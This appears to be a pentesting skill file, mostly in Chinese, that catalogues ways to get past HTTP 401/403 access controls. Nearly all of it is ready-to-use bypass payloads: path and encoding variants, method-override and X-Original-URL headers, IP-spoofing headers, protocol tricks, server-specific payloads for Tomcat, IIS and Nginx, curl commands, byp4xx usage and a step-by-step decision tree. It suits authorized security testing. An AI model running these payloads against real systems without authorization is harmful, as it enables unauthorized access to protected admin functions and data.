---
name: 401-403-bypass-techniques
description: 当受保护的 HTTP 路径返回 401 或 403 时使用。
version: 1.0.0
revision_date: 2026-08-31
license: MIT
platforms: [linux]
compatibility: Requires curl; byp4xx is optional.
metadata:
  tags: [recon, authorization, http, access-control, path-normalization]
  category: recon
  related_skills:
    - hunt-auth-bypass
    - hunt-http-smuggling
    - hunt-ssrf
    - hunt-idor
---

# 401/403 绕过技术

当两个 HTTP 处理层（CDN、反向代理、Web 服务器、框架）对同一请求做出不同判定时，就出现了绕过候选点。真正有价值的信号是路由或受保护内容发生了变化，而非仅有状态码。

## When to Use

- 已知路径返回 `401 Unauthorized` 或 `403 Forbidden`。
- 应用前方存在反向代理、WAF、API 网关或 CDN。
- 前端与后端对路径、方法或请求头的规范化方式不同。
- 可见 IIS、Tomcat、Spring、Apache、Nginx 或 WebDAV 的路由行为。
- 等价请求返回不同的状态码、请求头或响应体，暗示存在路由差异。

## Prerequisites

- 能保留原始路径的 HTTP 客户端：`curl --path-as-is` 或 Burp Repeater。
- 一个被拒绝的基线请求，以及用于标识预期受保护内容的标记。
- 可选工具：`byp4xx`、`dirsearch`、`feroxbuster`、Burp Intruder、`nghttp`、`nc`。

## How to Run

```bash
TARGET="https://target.example"
PATH_DENIED="/admin"
OUTDIR="${OUTPUT_DIR:-./output}/401-403"
mkdir -p "$OUTDIR"

# Denied baseline: record status, headers, and body for comparison.
curl -sS --path-as-is --max-time 10 \
  -D "$OUTDIR/baseline.headers" -o "$OUTDIR/baseline.body" \
  -w 'status=%{http_code} bytes=%{size_download} redirect=%{redirect_url}\n' \
  "$TARGET$PATH_DENIED"

# Compare candidates against the baseline.
curl -sS --path-as-is --max-time 10 -i "$TARGET/./${PATH_DENIED#/}"
curl -sS --path-as-is --max-time 10 -i -X OPTIONS "$TARGET$PATH_DENIED"
curl -sS --path-as-is --max-time 10 -i -H 'X-Forwarded-For: 127.0.0.1' "$TARGET$PATH_DENIED"
```

对每个候选点，将状态码、`Location`、响应体长度、标题以及受保护内容标记与基线进行对比。

## Procedure

### 1. 路径操纵绕过

核心思路：反向代理/WAF 检查的是一种路径格式，而后端采用的规范化方式不同。`✓` 标记指出那些通常能经由不同路由到达后端的请求形式；仅有 `200` 并不代表可以访问（参见 Verification 部分）。

#### 1.1 结尾斜杠 / 缺失斜杠

```
/admin      → 403
/admin/     → 200  ✓ (trailing slash)
/admin/.    → 200  ✓ (trailing dot)
```

#### 1.2 大小写敏感

```
/admin      → 403
/Admin      → 200  ✓
/ADMIN      → 200  ✓
/aDmIn      → 200  ✓
```

成立条件：代理规则区分大小写，而后端不区分（在 Windows/IIS 上常见）。

#### 1.3 URL 编码

```
/admin          → 403
/%61dmin        → 200  ✓ (encode 'a')
/admi%6e        → 200  ✓ (encode 'n')
/%61%64%6d%69%6e → 200  ✓ (full encode)
```

#### 1.4 双重 URL 编码

```
/admin              → 403
/%2561dmin          → 200  ✓ (%25 = %, decoded twice: %61 → a)
/admin%252f         → 200  ✓
/admin..%252f       → 200  ✓
```

#### 1.5 Unicode / UTF-8 编码

```
/admin          → 403
/admi%C0%AE     → 200  ✓ (overlong UTF-8 for '.')
/admi%C0%6E     → 200  ✓ (overlong UTF-8 for 'n')
/%C0%AFadmin    → 200  ✓ (overlong UTF-8 for '/')
```

现代 UTF-8 解码器会拒绝过长编码形式；这些变体针对的是遗留解析器与混合解码链条。

#### 1.6 点段 / 路径穿越

```
/admin          → 403
/./admin        → 200  ✓
//admin         → 200  ✓
/admin/./       → 200  ✓
/.//admin       → 200  ✓
/admin..;/      → 200  ✓ (Tomcat path parameter)
```

#### 1.7 空字节

```
/admin          → 403
/admin%00       → 200  ✓
/admin%00.json  → 200  ✓
/%00/admin      → 200  ✓
```

适用于较老的原生模块；现代托管运行时通常会拒绝内嵌的 NUL 字节。

#### 1.8 路径参数注入

```
/admin          → 403
/admin;foo=bar  → 200  ✓ (Tomcat/Java treats ; as path param)
/admin;         → 200  ✓
/admin;x        → 200  ✓
```

#### 1.9 结尾特殊字符

```
/admin%20 (space)  /admin%09 (tab)   /admin? (empty query)
/admin.json        /admin.html       /admin/~
```

#### 1.10 反斜杠（Windows/IIS）

```
/admin\    /admin\..\/    \..\admin
```

#### 1.11 组合路径技巧

```
///admin///    /./admin/./    /admin/..;/admin (Tomcat)    /%2e/admin
```

### 2. HTTP 方法绕过

#### 2.1 直接更改方法

```
GET  /admin → 403
POST /admin → 200  ✓
PUT  /admin → 200  ✓
PATCH /admin → 200  ✓
DELETE /admin → 200  ✓
OPTIONS /admin → 200  ✓ (may leak allowed methods)
TRACE /admin → 200  ✓ (may reflect headers — XST)
HEAD /admin → 200  ✓ (bodyless response; does not by itself confirm access to the protected body)
```

#### 2.2 方法覆盖请求头

当代理按方法进行拦截，但后端会读取覆盖类请求头时：

```http
GET /admin HTTP/1.1
X-HTTP-Method-Override: PUT

GET /admin HTTP/1.1
X-Method-Override: POST

GET /admin HTTP/1.1
X-HTTP-Method: DELETE

POST /admin HTTP/1.1
X-HTTP-Method-Override: PATCH
_method=PUT  (in POST body — Rails, Laravel)
```

#### 2.3 自定义 / 非法方法

```
FOOBAR /admin HTTP/1.1     → some ACLs only check GET/POST
GETS /admin HTTP/1.1       → typo-like methods may bypass
CONNECT /admin HTTP/1.1    → proxy may tunnel
PROPFIND /admin HTTP/1.1   → WebDAV method
MOVE /admin HTTP/1.1       → WebDAV method
```

### 3. 基于请求头的绕过

#### 3.1 URL 重写请求头（反向代理 / IIS ARR）

这些请求头会告诉后端"真正"的 URL，从而绕过代理层的路径检查：

```http
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin
```

代理看到的是 `GET /`（被允许），但后端会路由到 `/admin`。

#### 3.2 IP 欺骗请求头（白名单绕过）

可尝试的请求头（每个分别取值 `127.0.0.1`、`10.0.0.1`、`0.0.0.0`、`::1`）：

```http
X-Forwarded-For | X-Real-IP | X-Originating-IP | X-Remote-IP
X-Remote-Addr | X-Client-IP | True-Client-IP | Cluster-Client-IP
X-ProxyUser-IP | X-Custom-IP-Authorization | Forwarded: for=127.0.0.1
```

IP 编码变体：`0177.0.0.1`（八进制）、`2130706433`（十进制）、
`0x7f000001`（十六进制）、`localhost`

#### 3.3 其他请求头技巧

```http
Referer: https://target.com/admin     # Referrer check bypass
Origin: https://target.com             # Origin check bypass
Host: localhost                         # Host header manipulation
X-Forwarded-Host: localhost            # Forwarded host
Content-Type: application/json         # Content-type switch
X-Requested-With: XMLHttpRequest       # AJAX flag
```

### 4. 协议版本绕过

```http
# HTTP/1.0 (some ACLs only apply to HTTP/1.1)
GET /admin HTTP/1.0

# HTTP/0.9 (extremely legacy — no headers)
GET /admin

# HTTP/2 pseudo-header tricks
:method: GET
:path: /admin
:authority: target.com
# See the hunt-http-smuggling skill for H2-specific bypasses, including h2c upgrade.
```

### 5. 动词篡改 + 路径组合

组合多种技术以提高成功率：

```http
POST / HTTP/1.1                          # method override + URL rewrite
X-Original-URL: /admin
X-HTTP-Method-Override: GET

GET /%61dmin HTTP/1.1                    # IP spoof + path encoding
X-Forwarded-For: 127.0.0.1

GET /Admin HTTP/1.0                      # protocol + case + IP spoof
X-Forwarded-For: 127.0.0.1
```

### 6. 特定技术栈绕过

| 服务器 | 关键技巧 |
|---|---|
| **Apache** | `/admin/`（结尾斜杠）、`/.admin`（点前缀）、`/admin%0d`（CR） |
| **Nginx** | `/Admin`（大小写）、`/admin../`（规范化）、`X-Original-URL: /admin` |
| **IIS/ASP.NET** | `/admin;.css`（路径参数+扩展名）、`/admin\`（反斜杠）、`/admin::$DATA`（ADS）、`/admin%20` |
| **Tomcat/Java** | `/admin;foo`（路径参数）、`/admin..;/`（穿越）、`/;/admin`（空参数） |
| **Spring** | `/admin.anything`（后缀匹配，旧版本）、`/admin/`（结尾斜杠） |

### 7. 自动化工具

| 工具 | 用途 | URL |
|---|---|---|
| **byp4xx** | 全面的 403 绕过扫描器 | github.com/lobuhi/byp4xx |
| **dirsearch** | 带编码变体的目录爆破 | github.com/maurosoria/dirsearch |
| **feroxbuster** | 递归内容发现 | github.com/epi052/feroxbuster |
| **Burp Intruder** | 用于手工测试的自定义 payload 列表 | portswigger.net |

#### byp4xx 用法

```bash
# Basic usage: attempts path, method, header, and protocol variants.
byp4xx -m 10 --rate 5 -xD "https://target.com/admin"

# Output shows all attempted bypasses and their response codes.
# Treat 200/301/302 rows as candidates; confirm each against the baseline.
```

### 8. 决策树

```
Got 401 or 403 on a path?
│
├── Try PATH MANIPULATION first (highest success rate)
│   ├── /path/      (trailing slash)
│   ├── /PATH       (case change)
│   ├── /path%20    (trailing space)
│   ├── /./path     (dot segment)
│   ├── //path      (double slash)
│   ├── /path;x     (path parameter — Java/Tomcat)
│   ├── /path..;/   (Tomcat specific)
│   ├── /%2e/path   (encoded dot)
│   ├── /path%00    (null byte)
│   ├── /path%23    (encoded hash)
│   └── Result? → status/body differ from baseline = candidate
│
├── Path tricks failed → Try METHOD BYPASS
│   ├── POST/PUT/PATCH/DELETE/OPTIONS
│   ├── HEAD (bodyless GET — verify body access separately)
│   ├── X-HTTP-Method-Override: PUT
│   └── TRACE (may reflect auth headers — XST)
│
├── Method tricks failed → Try HEADER BYPASS
│   ├── X-Original-URL: /path      (reverse proxy/IIS rewrite)
│   ├── X-Rewrite-URL: /path       (same concept)
│   ├── X-Forwarded-For: 127.0.0.1 (IP whitelist)
│   ├── X-Real-IP: 127.0.0.1
│   ├── True-Client-IP: 127.0.0.1
│   └── Referer: https://target.com/path
│
├── Header tricks failed → Try PROTOCOL BYPASS
│   ├── HTTP/1.0 instead of 1.1
│   ├── HTTP/2 h2c smuggling (hunt-http-smuggling)
│   └── WebSocket upgrade
│
├── Single techniques failed → Try COMBINATIONS
│   ├── Method + Path: POST /PATH/
│   ├── Header + Path: X-Forwarded-For + /path%20
│   ├── All three: POST + X-Original-URL + IP headers
│   └── Protocol + Path: HTTP/1.0 + encoded path
│
├── All bypasses failed → Consider ALTERNATIVE APPROACHES
│   ├── Request smuggling (hunt-http-smuggling) → smuggle past ACL
│   ├── SSRF (hunt-ssrf) → access from server
│   ├── IDOR (hunt-idor) → access data directly
│   └── Auth flaws (hunt-auth-bypass) → login bypass
│
└── Automated scan with byp4xx for completeness
```

## 快速参考 —— 关键 Payload

```http
# Top 10 quick-wins (try these first)
GET /admin/     HTTP/1.1        # trailing slash
GET /Admin      HTTP/1.1        # case change
GET /admin%20   HTTP/1.1        # trailing space
GET /./admin    HTTP/1.1        # dot segment
GET //admin     HTTP/1.1        # double slash
POST /admin     HTTP/1.1        # method change
GET / HTTP/1.1                  # X-Original-URL bypass
X-Original-URL: /admin
GET /admin HTTP/1.1             # IP whitelist bypass
X-Forwarded-For: 127.0.0.1
GET /admin;.css HTTP/1.1        # IIS path param
GET /admin..;/ HTTP/1.1         # Tomcat bypass
```

## Pitfalls

- `200` 可能是登录页、通用错误页、WAF 质询页、SPA 外壳或缓存的公开响应。
- `301`/`302` 可能只是重定向到认证页面；请检查 `Location` 与目标响应体。
- `HEAD` 没有响应体；`OPTIONS` 和 `TRACE` 暴露的是方法行为，而非受保护内容。
- CDN、代理、服务器、框架与应用层各自的规范化方式可能不同；要判定是哪一层造成了变化。
- 浏览器与命令行客户端对 URL 的规范化方式不同；请使用 `--path-as-is`。
- 某些客户端与服务器会在任何检查执行前合并 `//` 与点段，因此候选请求可能以普通基线路径发出；请确认原始请求目标（Burp Repeater 会显示实际发送的内容）。
- 遗留解析器形式只在与兼容解析器共存时才生效。
- 缓存命中可能让不同请求看起来完全相同，或让候选点看似成功，实际却未到达受保护的处理程序。

## Verification

- 将每个候选点与被拒绝的基线进行对比：状态码、原因短语、`Location`、`WWW-Authenticate`、`Allow`、缓存与内容类型请求头、标题、响应体长度以及受保护内容标记。
- 当缓存行为不明确时，使用缓存清除参数重复测试。
- 当候选点能够到达基线无法到达的受保护内容或行为时，才确认绕过成立；仅状态码变化只是一个观察结果，而非绕过。
